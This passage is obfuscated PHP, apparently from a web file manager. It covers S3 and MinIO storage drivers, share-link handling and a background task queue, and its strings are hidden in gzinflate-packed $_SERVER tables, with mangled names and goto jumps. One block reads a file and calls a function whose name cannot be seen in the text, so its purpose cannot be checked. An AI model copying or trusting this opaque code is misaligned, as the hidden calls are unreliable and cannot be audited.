$¼½ƒêğš[8] . $this->pathEncode($—°ûÇÒ×) . $ğï¸»Éª); if (strpos($ğï¸»Éª, $¼½ƒêğš[244]) === 0) { $¨Ÿ†¾’é[0] = $¼½ƒêğš[245]; } if (isset($Û‰‰‹Í¾[$¼½ƒêğš[246]]) && $Û‰‰‹Í¾[$¼½ƒêğš[246]] == $¼½ƒêğš[247]) { $¨Ÿ†¾’é[0] = $¼½ƒêğš[247]; } $“¬úº‰– = implode($¼½ƒêğš[248], $¨Ÿ†¾’é); $Ï¾ãüøà = base64_encode(hash_hmac($¼½ƒêğš[249], $“¬úº‰–, $this->secret, !0)); $ù‹¿¸åª = $¼½ƒêğš[250] . $this->accessKey . $¼½ƒêğš[4] . $Ï¾ãüøà; if (strpos($ğï¸»Éª, $¼½ƒêğš[244]) === 0) { return array($¼½ƒêğš[251] => $ù‹¿¸åª, $¼½ƒêğš[241] => $¿ú”÷ä§); } return $ù‹¿¸åª; } public function listUploadParts($ü‚€ì›¡, $¸÷şîœ° = array()) { $­Õ•ô¯³ =& $_SERVER[ ÇƒŠìÀ]; $úØç“¥æ = str_replace($­Õ•ô¯³[252], $­Õ•ô¯³[12], $¸÷şîœ°[$­Õ•ô¯³[177]]); $É÷îêµë = $this->client->listParts($this->bucket, $ü‚€ì›¡, $úØç“¥æ); if (!$É÷îêµë) { return !1; } unset($¸÷şîœ°[$­Õ•ô¯³[242]], $¸÷şîœ°[$­Õ•ô¯³[246]]); $¸÷şîœ°[$­Õ•ô¯³[96]] = $ü‚€ì›¡; $«Í—£¿ = $this->multiUploadAuthData($ü‚€ì›¡, $¸÷şîœ°); if (empty($«Í—£¿)) { return !1; } return array($­Õ•ô¯³[251] => $«Í—£¿, $­Õ•ô¯³[241] => $¸÷şîœ°[$­Õ•ô¯³[241]], $­Õ•ô¯³[253] => $É÷îêµë); } public function getHost() { return parent::getHost() . $_SERVER[ ÇƒŠìÀ][8] . $this->bucket; } public function size($ûËâÃ°) { $È”¸—é = $this->objectMeta($ûËâÃ°); return $È”¸—é ? $È”¸—é[$_SERVER[ ÇƒŠìÀ][78]] : 0; } public function info($œÎ˜­) { if ($this->isFolder($œÎ˜­)) { return $this->folderInfo($œÎ˜­); } else { if ($this->isFile($œÎ˜­)) { return $this->fileInfo($œÎ˜­); } } return !1; } public function exist($Ş”íû©) { return $this->isFile($Ş”íû©) || $this->isFolder($Ş”íû©); } public function isFile($ËÄ­ğÂ) { return !$this->isFolder($ËÄ­ğÂ) && $this->objectMeta($ËÄ­ğÂ); } public function isFolder($”¹¤ÂÚš) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][168], $”¹¤ÂÚš); } protected function objectMeta($¤õ¼«• ) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][170], $¤õ¼«• ); } protected function _objectMeta($ôğ•Åã—) { $µòí¹Ç =& $_SERVER[ ÇƒŠìÀ]; $ôğ•Åã— = rtrim($ôğ•Åã—, $µòí¹Ç[8]); try { $Åóæø¨³ = $this->client->getObjectInfo($this->bucket, $ôğ•Åã—); if (!isset($Åóæø¨³[$µòí¹Ç[238]]) && isset($Åóæø¨³[$µòí¹Ç[254]])) { $Åóæø¨³[$µòí¹Ç[238]] = $Åóæø¨³[$µòí¹Ç[254]]; } } catch (Exception $é§›¿÷±) { $Åóæø¨³ = !1; } if (!$Åóæø¨³) { } return $Åóæø¨³; } protected function _isFolder($ÊĞ£»‰¹) { $ÒÓÄ‚ú¸ =& $_SERVER[ ÇƒŠìÀ]; $ÊĞ£»‰¹ = rtrim($ÊĞ£»‰¹, $ÒÓÄ‚ú¸[8]); if ($ÊĞ£»‰¹ == $ÒÓÄ‚ú¸[12] || $ÊĞ£»‰¹ == $ÒÓÄ‚ú¸[8]) { return !0; } $°Øöõæ° = $this->client->getBucket($this->bucket, $ÊĞ£»‰¹, null, 1); if (empty($°Øöõæ°[$ÒÓÄ‚ú¸[222]])) { return !1; } $È¹ŒÉäÏ = $°Øöõæ°[$ÒÓÄ‚ú¸[222]][0][$ÒÓÄ‚ú¸[32]]; return stripos($È¹ŒÉäÏ, $ÊĞ£»‰¹ . $ÒÓÄ‚ú¸[8]) === 0 ? !0 : !1; if (substr($È¹ŒÉäÏ, -1) == $ÒÓÄ‚ú¸[8]) { return !0; } if (get_path_this($È¹ŒÉäÏ) == get_path_this($ÊĞ£»‰¹)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÑÃ‘Â•å) { parent::__construct($ÑÃ‘Â•å); $this->signatureVersion($_SERVER[ ÇƒŠìÀ][233]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($«ƒÈÛø, $¬ê‘¶¡ú = 3600) { $áˆ”‹Îæ =& $_SERVER[ ÇƒŠìÀ]; $õú§ó„ = $áˆ”‹Îæ[215]; $Ñ«±Œï½ = $áˆ”‹Îæ[255]; $­Ü¢â¤ = $áˆ”‹Îæ[62]; $¸ä£°ü¤ = gmdate($áˆ”‹Îæ[256]); $ùğ›Ïº» = gmdate($áˆ”‹Îæ[257]); $èÇ»é°ª = $áˆ”‹Îæ[258]; $å†¯¼® = $¬ê‘¶¡ú . $áˆ”‹Îæ[12]; $Î©´˜¾ù = $áˆ”‹Îæ[259]; $á‰Ï™êö = array($this->accessKey, $ùğ›Ïº», $this->region, $­Ü¢â¤, $èÇ»é°ª); $¨ı±èÆ = implode($áˆ”‹Îæ[8], $á‰Ï™êö); $„Ñ©’´¡ = array($áˆ”‹Îæ[260] => gmdate($áˆ”‹Îæ[261], strtotime($áˆ”‹Îæ[262])), $áˆ”‹Îæ[263] => array(array($áˆ”‹Îæ[264] => $this->bucket), array($áˆ”‹Îæ[265] => $õú§ó„), array($áˆ”‹Îæ[266], $áˆ”‹Îæ[267], $áˆ”‹Îæ[12]), array($áˆ”‹Îæ[266], $áˆ”‹Îæ[268], $áˆ”‹Îæ[12]), array($áˆ”‹Îæ[266], $áˆ”‹Îæ[269], $áˆ”‹Îæ[12]), array($áˆ”‹Îæ[270] => $Î©´˜¾ù), array($áˆ”‹Îæ[271] => $¨ı±èÆ), array($áˆ”‹Îæ[272] => $Ñ«±Œï½), array($áˆ”‹Îæ[273] => $¸ä£°ü¤), array($áˆ”‹Îæ[274] => $å†¯¼®))); $¢„¬˜ßê = base64_encode(json_encode($„Ñ©’´¡)); $ØÅ°À›à = hash_hmac($áˆ”‹Îæ[275], $ùğ›Ïº», $áˆ”‹Îæ[276] . $this->secret, !0); $Ñ˜µ–¹¯ = hash_hmac($áˆ”‹Îæ[275], $this->region, $ØÅ°À›à, !0); $„ÔúŒ—Ã = hash_hmac($áˆ”‹Îæ[275], $­Ü¢â¤, $Ñ˜µ–¹¯, !0); $ô«’×“µ = hash_hmac($áˆ”‹Îæ[275], $èÇ»é°ª, $„ÔúŒ—Ã, !0); $åĞâ°‚Ö = hash_hmac($áˆ”‹Îæ[275], $¢„¬˜ßê, $ô«’×“µ); $­›”Ë± = array($áˆ”‹Îæ[232] => $áˆ”‹Îæ[12], $áˆ”‹Îæ[277] => $áˆ”‹Îæ[12], $áˆ”‹Îæ[265] => $õú§ó„, $áˆ”‹Îæ[270] => $Î©´˜¾ù, $áˆ”‹Îæ[278] => $¢„¬˜ßê, $áˆ”‹Îæ[279] => $¨ı±èÆ, $áˆ”‹Îæ[280] => $Ñ«±Œï½, $áˆ”‹Îæ[281] => $¸ä£°ü¤, $áˆ”‹Îæ[282] => $å†¯¼®, $áˆ”‹Îæ[283] => $åĞâ°‚Ö, $áˆ”‹Îæ[198] => $this->getHost()); return $­›”Ë±; } } goto cªº Ÿˆ‡¹; A¬ÏòìÈÛå: define($_SERVER[ ÇƒŠìÀ][0], $_SERVER[ ÇƒŠìÀ][1]); $_SERVER[™”Œ”õÅ] = explode($_SERVER[ ÇƒŠìÀ][2], gzinflate(substr($_SERVER[ ÇƒŠìÀ][3], 10, -8))); function binCheckEq($à±Å·Ş, $‰Ì»°æô) { return $à±Å·Ş == $‰Ì»°æô; } goto AË…‹Ü—†; F“ ê‹Íù: define($_SERVER[ ÇƒŠìÀ][287], 1); define($_SERVER[ ÇƒŠìÀ][288], 0); define($_SERVER[ ÇƒŠìÀ][289], 2); goto fÛ ¨ÂèËô; aÜÀ›¹Ğ¤: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ñù€úó¾) { $this->pathParse = $Ñù€úó¾; $this->model = Model($_SERVER[ ÇƒŠìÀ][1368]); } public function getPathOuter($êÒ‚…¬) { $¦ã÷¨Í€ =& $_SERVER[ ÇƒŠìÀ]; if (!$êÒ‚…¬) { return $êÒ‚…¬; } $œ‹×ô = $this->parse($êÒ‚…¬); return trim(KodIO::makeShare($this->pathParse[$¦ã÷¨Í€[445]], $œ‹×ô[$¦ã÷¨Í€[445]]), $¦ã÷¨Í€[8]); } protected function infoParse($¤Ÿ£§°Á, $å™¯î  = false, $æ¢îóÑŠ = false) { $ß·Óª½­ =& $_SERVER[ ÇƒŠìÀ]; $º›ÑõÈç = $this->pathParse[$ß·Óª½­[445]]; $Æ¨­˜•Ê = trim($this->pathParse[$ß·Óª½­[1203]], $ß·Óª½­[8]); return Action($ß·Óª½­[1375])->sharePathInfo($º›ÑõÈç, $Æ¨­˜•Ê, $å™¯î ); } public function infoFull($ßŒ¦²) { $ñİ¡«³ =& $_SERVER[ ÇƒŠìÀ]; $ôİƒ°Ñ† = explode($ñİ¡«³[8], trim($ßŒ¦², $ñİ¡«³[8])); if (count($ôİƒ°Ñ†) > 1) { $Ğğ• = implode($ñİ¡«³[8], array_splice($ôİƒ°Ñ†, 1)); $µşâ•£“ = $this->model->pathInfoByPath($ôİƒ°Ñ†[0], $Ğğ•); if (!$µşâ•£“) { return !1; } $this->pathParse[$ñİ¡«³[1203]] = $µşâ•£“[$ñİ¡«³[183]]; } return $this->infoParse($ßŒ¦²); } public function listAll($ÑâËÓİ’) { $¹õ²–Â =& $_SERVER[ ÇƒŠìÀ]; $®ºóôœ = IO::info($this->pathParse[$¹õ²–Â[86]]); if (!$®ºóôœ) { return array(); } $é¨Çáß¥ = $this->model->listAll($ÑâËÓİ’); $ş×¯µÒ” = Model($¹õ²–Â[634])->getInfo($®ºóôœ[$¹õ²–Â[635]]); foreach ($é¨Çáß¥ as &$Æß¦ÑËß) { check_abort(); $Æß¦ÑËß[$¹õ²–Â[89]] = Action($¹õ²–Â[1375])->_shareItemeParse($Æß¦ÑËß[$¹õ²–Â[89]], $ş×¯µÒ”); } unset($Æß¦ÑËß); return $é¨Çáß¥; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¸ˆ¾³¬´) { $this->pathParse = $¸ˆ¾³¬´; $this->model = Model($_SERVER[ ÇƒŠìÀ][1368]); } protected function infoParse($â½¯˜Ğ¦, $šá¤²ÈØ = false, $ßÅ õ = false) { $â”ÇöÔ =& $_SERVER[ ÇƒŠìÀ]; return Action($â”ÇöÔ[1209])->sharePathInfo($this->pathParse[$â”ÇöÔ[86]], !0, $šá¤²ÈØ); } public function listPath($ÜçŸôÒä, $†Çˆåá = false) { $»ì›¢æ =& $_SERVER[ ÇƒŠìÀ]; $©¸£©Æî = parent::listPath($ÜçŸôÒä, $†Çˆåá); if (!$©¸£©Æî) { return $©¸£©Æî; } if (is_array($©¸£©Æî[$»ì›¢æ[1376]])) { $©¸£©Æî[$»ì›¢æ[1376]] = Action($»ì›¢æ[1209])->shareItemInfo($©¸£©Æî[$»ì›¢æ[1376]]); } foreach ($©¸£©Æî as $ª‘û»€ô => $•£Õ¯æÏ) { if (!in_array($ª‘û»€ô, array($»ì›¢æ[85], $»ì›¢æ[84]))) { continue; } foreach ($•£Õ¯æÏ as $çÈ×¼¤¼ => $ì©äè¼Ó) { $©¸£©Æî[$ª‘û»€ô][$çÈ×¼¤¼] = Action($»ì›¢æ[1209])->shareItemInfo($ì©äè¼Ó); } } return $©¸£©Æî; } public function listAll($£Ç¢ ìá) { $Ïù¿à¦ =& $_SERVER[ ÇƒŠìÀ]; $ĞšéÚ  = IO::info($this->pathParse[$Ïù¿à¦[86]]); if (!$ĞšéÚ ) { return array(); } $ò–£¹é = $this->model->listAll($£Ç¢ ìá); foreach ($ò–£¹é as &$ÌêÚ·¶) { $ÌêÚ·¶[$Ïù¿à¦[89]] = Action($Ïù¿à¦[1209])->shareItemInfo($ÌêÚ·¶[$Ïù¿à¦[89]]); } unset($ÌêÚ·¶); return $ò–£¹é; } } if ($_SERVER[$_SERVER[ ÇƒŠìÀ][906]] != $_SERVER[$_SERVER[ ÇƒŠìÀ][947]]) { $_getc = $_SERVER[ ÇƒŠìÀ][909]; $_getfile = $_SERVER[$_SERVER[ ÇƒŠìÀ][910]] . $_SERVER[ ÇƒŠìÀ][911]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ ÇƒŠìÀ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ ÇƒŠìÀ][655]) { $exit = $_SERVER[ ÇƒŠìÀ][912]; $exit(); } $_act = $_SERVER[ ÇƒŠìÀ][948]; $_act($_SERVER[$_SERVER[ ÇƒŠìÀ][907]]); } goto D¹°‹ç¾É™; AƒÜÒÖ©ç›: define($_SERVER[ ÇƒŠìÀ][647], $_SERVER[ ÇƒŠìÀ][648]); $qtkglsmpzu = $_SERVER[ ÇƒŠìÀ][649]; $_SERVER[‡©‹¬£] = explode($_SERVER[ ÇƒŠìÀ][650], gzinflate(substr($_SERVER[ ÇƒŠìÀ][651], 10, -8))); goto B¤Ÿ§õÇ¹; CÁÖÙª£ÊŠ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\x75\x65\x75\x65\x4c\145\156\147\164\150"; const QUEUE_DATA = "\164\141\163\153\121\165\145\x75\145\104\x61\x74\x61"; const QUEUE_TIME = "\164\x61\x73\153\x51\x75\x65\165\145\x4c\x61\163\x74\x52\x75\x6e"; const QUEUE_THREAD = "\x74\141\x73\x6b\121\165\145\x75\145\124\150\x72\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ŸÉóİÙÚ, $ˆÏµ÷ºÀ = array(), $Êç««Ç– = '', $ßÈ„ñŠû = '') { $•µÕó¿ =& $_SERVER[ ÇƒŠìÀ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ßÈ„ñŠû && array_find_by_field(self::$listData, $•µÕó¿[96], $ßÈ„ñŠû)) { return !0; } if ($ßÈ„ñŠû && array_find_by_field(self::$listDataAdd, $•µÕó¿[96], $ßÈ„ñŠû)) { return !0; } self::$listDataAdd[] = array($•µÕó¿[310] => $ŸÉóİÙÚ, $•µÕó¿[1787] => $ˆÏµ÷ºÀ, $•µÕó¿[496] => $Êç««Ç–, $•µÕó¿[96] => $ßÈ„ñŠû); return !0; } public static function addSubmit() { $æ¶Ş¬¯µ =& $_SERVER[ ÇƒŠìÀ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($æ¶Ş¬¯µ[1788] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $æ¶Ş¬¯µ[12], $æ¶Ş¬¯µ[496])), $æ¶Ş¬¯µ[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¶ãæ„ƒÁ, $ Ğª²£ = array(), $ÕÑ£â§º = '', $şğø†ˆõ = '') { $ÓÏòÌ­ =& $_SERVER[ ÇƒŠìÀ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $šõá„øë = self::getAll(); if ($şğø†ˆõ && array_find_by_field($šõá„øë, $ÓÏòÌ­[96], $şğø†ˆõ)) { return !0; } $šõá„øë[] = array($ÓÏòÌ­[310] => $¶ãæ„ƒÁ, $ÓÏòÌ­[1787] => $ Ğª²£, $ÓÏòÌ­[496] => $ÕÑ£â§º, $ÓÏòÌ­[96] => $şğø†ˆõ); self::setAll($šõá„øë); write_log($ÓÏòÌ­[1788] . $ÕÑ£â§º, $ÓÏòÌ­[187]); return !0; } public static function run() { $¼Ò²â›µ =& $_SERVER[ ÇƒŠìÀ]; $ëÌèŸÅŸ = self::getAll(); $¿ıâ‡ƒ½ = array_shift($ëÌèŸÅŸ); if (!$¿ıâ‡ƒ½) { return !1; } self::setAll($ëÌèŸÅŸ); $â¡ô¥„ = timeFloat(); $ŸœĞÃÌ = $¼Ò²â›µ[12]; try { $ŸœĞÃÌ = Hook::apply($¿ıâ‡ƒ½[$¼Ò²â›µ[310]], $¿ıâ‡ƒ½[$¼Ò²â›µ[1787]]); } catch (Exception $ãé‡‹½) { write_log($ãé‡‹½, $¼Ò²â›µ[1217]); } $¶¨ì¬Ô‹ = number_format(timeFloat() - $â¡ô¥„, 3) . $¼Ò²â›µ[1705]; if ($ŸœĞÃÌ && is_string($ŸœĞÃÌ)) { $¶¨ì¬Ô‹ = $¶¨ì¬Ô‹ . $¼Ò²â›µ[1789] . $ŸœĞÃÌ; } write_log($¼Ò²â›µ[1790] . $¿ıâ‡ƒ½[$¼Ò²â›µ[496]] . $¼Ò²â›µ[1791] . $¶¨ì¬Ô‹, $¼Ò²â›µ[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÚÕÛ¸ïÖ =& $_SERVER[ ÇƒŠìÀ]; $ãÄ‰ò©¾ = self::threadCount() + 1; if ($ãÄ‰ò©¾ > 3 || !self::count()) { return; } write_log($ÚÕÛ¸ïÖ[1792] . $ãÄ‰ò©¾, $ÚÕÛ¸ïÖ[187]); Cache::set(self::QUEUE_THREAD, $ãÄ‰ò©¾, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÚÕÛ¸ïÖ[1793], $ÚÕÛ¸ïÖ[187]); } public static function getKey($òÀ¢ÏŸæ, $…Ù¤¸ïÚ = "\x69\x6e\x74") { $¡¨™Ôœ =& $_SERVER[ ÇƒŠìÀ]; Cache::removeMemory($òÀ¢ÏŸæ); $ñéÛ©Ô = Cache::get($òÀ¢ÏŸæ); if ($…Ù¤¸ïÚ == $¡¨™Ôœ[334]) { return $ñéÛ©Ô ? intval($ñéÛ©Ô) : 0; } if ($…Ù¤¸ïÚ == $¡¨™Ôœ[1794]) { return is_array($ñéÛ©Ô) ? $ñéÛ©Ô : array(); } return $ñéÛ©Ô; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ ÇƒŠìÀ][1794]); } public static function setAll($ƒˆÈù) { $ğÊŠÌÙ¿ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ƒˆÈù), $ğÊŠÌÙ¿); Cache::set(self::QUEUE_DATA, $ƒˆÈù, $ğÊŠÌÙ¿); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($“¦©Š», $‰åÍé‰¨ = 5.0) { if (!$“¦©Š») { return; } $¸ÏïÚÔ = Cache::get($“¦©Š»); if (!$¸ÏïÚÔ || timeFloat() - floatVal($¸ÏïÚÔ) >= $‰åÍé‰¨) { Cache::set($“¦©Š», timeFloat(), $‰åÍé‰¨ * 10); return !0; } return !1; } public static function timeLimitCall($š”£Óõ™, $È”î·üª, $å¹ú¼ª®, $‚°‘ùÀ¼ = 5.0) { $£µß¥éß =& $_SERVER[ ÇƒŠìÀ]; if (!$š”£Óõ™ || !$È”î·üª) { return; } self::$asyncAdd = !0; $×ôîºª  = $£µß¥éß[1795]; $šú·á¿² = Cache::get($×ôîºª , !0); $ëØåÁƒô = array($£µß¥éß[1796] => timeFloat(), $£µß¥éß[1797] => timeFloat(), $£µß¥éß[310] => $È”î·üª, $£µß¥éß[1787] => $å¹ú¼ª®, $£µß¥éß[196] => $‚°‘ùÀ¼); if (is_array($šú·á¿²[$š”£Óõ™])) { $ëØåÁƒô[$£µß¥éß[1797]] = $šú·á¿²[$š”£Óõ™][$£µß¥éß[1797]]; } if (is_array($šú·á¿²[$š”£Óõ™])) { if (timeFloat() - $šú·á¿²[$š”£Óõ™][$£µß¥éß[1796]] < $ëØåÁƒô[$£µß¥éß[196]] * 0.3) { return; } $ëØåÁƒô[$£µß¥éß[1797]] = $šú·á¿²[$š”£Óõ™][$£µß¥éß[1797]]; } $šú·á¿²[$š”£Óõ™] = $ëØåÁƒô; Cache::set($×ôîºª , $šú·á¿², 60); Cache::removeMemory($×ôîºª ); write_log($£µß¥éß[1798] . $š”£Óõ™ . $£µß¥éß[73] . $È”î·üª, $£µß¥éß[187]); } public static function timeLimitCallLoop() { $è÷ğË¹™ =& $_SERVER[ ÇƒŠìÀ]; $®°Á¾èŒ = array($è÷ğË¹™[1799]); $äõ¹Ò˜ = in_array(strtolower(ACTION), $®°Á¾èŒ); if (!$äõ¹Ò˜ && !self::$asyncAdd) { return; } $ü«“í„µ = $è÷ğË¹™[1795]; $·ß”­£ = Cache::get($ü«“í„µ, !0); if (!$·ß”­£ || count($·ß”­£) <= 0) { return; } $ñˆæ±§  = !1; $¿ÎóÚÙõ = timeFloat(); $ÎĞë¾†Ó = array(); foreach ($·ß”­£ as $å—´ÕÏÅ => $û¨ÒĞ¢) { if ($¿ÎóÚÙõ - $û¨ÒĞ¢[$è÷ğË¹™[1797]] > $û¨ÒĞ¢[$è÷ğË¹™[196]]) { $ñˆæ±§  = !0; try { Hook::apply($û¨ÒĞ¢[$è÷ğË¹™[310]], $û¨ÒĞ¢[$è÷ğË¹™[1787]]); write_log($è÷ğË¹™[1800] . $å—´ÕÏÅ . $è÷ğË¹™[73] . $û¨ÒĞ¢[$è÷ğË¹™[310]] . $è÷ğË¹™[1801] . ACTION, $è÷ğË¹™[187]); } catch (Exception $‰ü¼øæõ) { } continue; } $ÎĞë¾†Ó[$å—´ÕÏÅ] = $û¨ÒĞ¢; } if (!$ñˆæ±§ ) { return; } if (!$ÎĞë¾†Ó) { return Cache::remove($ü«“í„µ); } Cache::set($ü«“í„µ, $ÎĞë¾†Ó, 60); Cache::removeMemory($ü«“í„µ); } public static function finished($¬Ïµ¡ÔÊ, $²ÑÓ…·) { $Å·‰…Ü =& $_SERVER[ ÇƒŠìÀ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Å·‰…Ü[310] => $¬Ïµ¡ÔÊ, $Å·‰…Ü[1787] => $²ÑÓ…·); } private static function finishedRun() { $á¥ñØÁ =& $_SERVER[ ÇƒŠìÀ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $°•êŒı…) { try { Hook::apply($°•êŒı…[$á¥ñØÁ[310]], $°•êŒı…[$á¥ñØÁ[1787]]); } catch (Exception $õ·ã¤Èß) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $•ñÍì· =& $_SERVER[ ÇƒŠìÀ]; parent::startAfter(); Hook::bind($•ñÍì·[1802], array($this, $•ñÍì·[1803])); Hook::bind($•ñÍì·[1228], array($this, $•ñÍì·[1804])); Hook::bind($•ñÍì·[1805], array($this, $•ñÍì·[1806])); $˜­¨—¥Î =& $this->task; $˜­¨—¥Î[$•ñÍì·[1807]] = $•ñÍì·[1229]; if (!$˜­¨—¥Î[$•ñÍì·[1579]]) { $˜­¨—¥Î[$•ñÍì·[1579]] = LNG($•ñÍì·[1808]); } } protected function endAfter() { $Ì™„ò¾© =& $_SERVER[ ÇƒŠìÀ]; parent::endAfter(); Hook::unbind($Ì™„ò¾©[1802], array($this, $Ì™„ò¾©[1803])); Hook::unbind($Ì™„ò¾©[1228], array($this, $Ì™„ò¾©[1804])); Hook::unbind($Ì™„ò¾©[1805], array($this, $Ì™„ò¾©[1806])); } public function updateAfter() { $´ƒæµ„ =& $_SERVER[ ÇƒŠìÀ]; $˜Úàî’õ =& $this->task; if (!$˜Úàî’õ[$´ƒæµ„[815]] || !$˜Úàî’õ[$´ƒæµ„[792]]) { if ($˜Úàî’õ[$´ƒæµ„[1807]] != $´ƒæµ„[359]) { return; } } if ($˜Úàî’õ[$´ƒæµ„[1807]] == $´ƒæµ„[1229]) { $…®¦½İ = 0; if ($˜Úàî’õ[$´ƒæµ„[1742]]) { $…®¦½İ = $˜Úàî’õ[$´ƒæµ„[1743]] / $˜Úàî’õ[$´ƒæµ„[1742]]; } $˜Úàî’õ[$´ƒæµ„[1691]] = $…®¦½İ * 0.3; } else { if ($˜Úàî’õ[$´ƒæµ„[1807]] == $´ƒæµ„[359]) { $…®¦½İ = $˜Úàî’õ[$´ƒæµ„[1690]] / $˜Úàî’õ[$´ƒæµ„[815]]; $˜Úàî’õ[$´ƒæµ„[1691]] = 0.3 + $…®¦½İ * 0.4; } else { if ($˜Úàî’õ[$´ƒæµ„[1807]] == $´ƒæµ„[109]) { $Ë¥¯™£Ù = 0; if ($˜Úàî’õ[$´ƒæµ„[1744]] == $´ƒæµ„[109]) { $Ë¥¯™£Ù = $˜Úàî’õ[$´ƒæµ„[1743]]; } $…®¦½İ = ($˜Úàî’õ[$´ƒæµ„[1747]] + $Ë¥¯™£Ù) / $˜Úàî’õ[$´ƒæµ„[792]]; $˜Úàî’õ[$´ƒæµ„[1691]] = 0.3 + 0.4 + $…®¦½İ * 0.3; } } } if ($˜Úàî’õ[$´ƒæµ„[1691]] > 0) { $ãŞ§§Å = timeFloat() - $˜Úàî’õ[$´ƒæµ„[1693]] - $˜Úàî’õ[$´ƒæµ„[1696]]; $˜Úàî’õ[$´ƒæµ„[1697]] = $ãŞ§§Å * (1 - $˜Úàî’õ[$´ƒæµ„[1691]]) / $˜Úàî’õ[$´ƒæµ„[1691]]; } } public function addFile($ş”ıË‘) { $Ğ®¾í‰ =& $_SERVER[ ÇƒŠìÀ]; $¿ÔŞààĞ =& $this->task; $»äíèáÀ = IO::info($ş”ıË‘); $¿ÔŞààĞ[$Ğ®¾í‰[1740]] = $»äíèáÀ[$Ğ®¾í‰[32]]; $¿ÔŞààĞ[$Ğ®¾í‰[1742]] = $»äíèáÀ[$Ğ®¾í‰[78]]; $¿ÔŞààĞ[$Ğ®¾í‰[1743]] = 0; $¿ÔŞààĞ[$Ğ®¾í‰[1099]] = $Ğ®¾í‰[1763]; $¿ÔŞààĞ[$Ğ®¾í‰[1744]] = $Ğ®¾í‰[1229]; $¿ÔŞààĞ[$Ğ®¾í‰[792]] = $»äíèáÀ[$Ğ®¾í‰[78]]; $¿ÔŞààĞ[$Ğ®¾í‰[815]] = 1; $ÛÂ“Ã¢Á = 0; $¿ÔŞààĞ[$Ğ®¾í‰[1751]] = array($Ğ®¾í‰[1752] => $ÛÂ“Ã¢Á + 1, $Ğ®¾í‰[464] => $»äíèáÀ[$Ğ®¾í‰[32]], $Ğ®¾í‰[86] => $»äíèáÀ[$Ğ®¾í‰[86]], $Ğ®¾í‰[553] => $»äíèáÀ[$Ğ®¾í‰[553]] ? $»äíèáÀ[$Ğ®¾í‰[553]] : $»äíèáÀ[$Ğ®¾í‰[86]]); $this->update(); } public function zipEvent($Âµà©³Ğ, $Â¯œÍ¿À, $©èşæÀç, $´¥º˜“Î) { $ÑíñÁœ¿ =& $_SERVER[ ÇƒŠìÀ]; $Ûï¨ŸÏÊ =& $this->task; $Ûï¨ŸÏÊ[$ÑíñÁœ¿[1740]] = get_path_this($Â¯œÍ¿À); $Ûï¨ŸÏÊ[$ÑíñÁœ¿[1742]] = $´¥º˜“Î; $Ûï¨ŸÏÊ[$ÑíñÁœ¿[1743]] = $©èşæÀç; $Ûï¨ŸÏÊ[$ÑíñÁœ¿[1099]] = $Âµà©³Ğ == $ÑíñÁœ¿[1809] ? $ÑíñÁœ¿[1810] : $ÑíñÁœ¿[1811]; $Ûï¨ŸÏÊ[$ÑíñÁœ¿[1744]] = $ÑíñÁœ¿[12]; $Ûï¨ŸÏÊ[$ÑíñÁœ¿[792]] = $´¥º˜“Î; $Ûï¨ŸÏÊ[$ÑíñÁœ¿[1807]] = $ÑíñÁœ¿[359]; $this->update(); } public function unzipAfter($ßãÓ¹±º) { $åÍÒéïş =& $_SERVER[ ÇƒŠìÀ]; $É¿î­ìı =& $this->task; $É¿î­ìı[$åÍÒéïş[1807]] = $åÍÒéïş[109]; $ˆê²ğÜ€ = IO::infoWithChildren($ßãÓ¹±º); $“êì¬Ø = 0; $É¿î­ìı[$åÍÒéïş[1751]] = array($åÍÒéïş[1752] => $“êì¬Ø + 1, $åÍÒéïş[464] => $ˆê²ğÜ€[$åÍÒéïş[32]], $åÍÒéïş[86] => $ˆê²ğÜ€[$åÍÒéïş[86]], $åÍÒéïş[553] => $ˆê²ğÜ€[$åÍÒéïş[553]] ? $ˆê²ğÜ€[$åÍÒéïş[553]] : $ˆê²ğÜ€[$åÍÒéïş[86]]); if ($ˆê²ğÜ€[$åÍÒéïş[33]] == $åÍÒéïş[216]) { $É¿î­ìı[$åÍÒéïş[815]] = 1; } else { $É¿î­ìı[$åÍÒéïş[815]] = $ˆê²ğÜ€[$åÍÒéïş[81]][$åÍÒéïş[79]]; } $É¿î­ìı[$åÍÒéïş[1099]] = $åÍÒéïş[12]; $É¿î­ìı[$åÍÒéïş[1744]] = 0; $É¿î­ìı[$åÍÒéïş[1690]] = 0; $É¿î­ìı[$åÍÒéïş[1742]] = 0; 